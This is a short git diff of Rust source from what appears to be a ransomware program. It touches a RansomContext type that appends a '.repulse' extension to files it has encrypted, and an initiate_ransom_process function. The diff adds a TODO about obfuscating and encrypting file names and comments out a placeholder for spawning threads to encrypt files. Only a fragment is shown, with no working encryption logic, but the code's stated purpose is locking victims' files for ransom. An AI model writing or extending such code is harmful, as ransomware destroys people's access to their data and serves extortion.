@@ -302,6 +302,7 @@ impl RansomContext {
         let mut file_name = file.to_str().unwrap().to_owned();
         file_name.push_str(".repulse");
 
+        // TODO obfuscate and encrypt file name?
         fs::rename(file, &file_name).map_err(|_| EncryptionError::FileAccessDenied)?;
 
         Ok(())
@@ -375,7 +376,7 @@ pub fn initiate_ransom_process() {
 
     *RANSOM_CONTEXT.write().unwrap() = Some(ransom_context);
 
-    todo!("Spawn thread pool to encrypt files");
+    // todo!("Spawn thread pool to encrypt files");
 }
 
 #[allow(unreachable_code)]
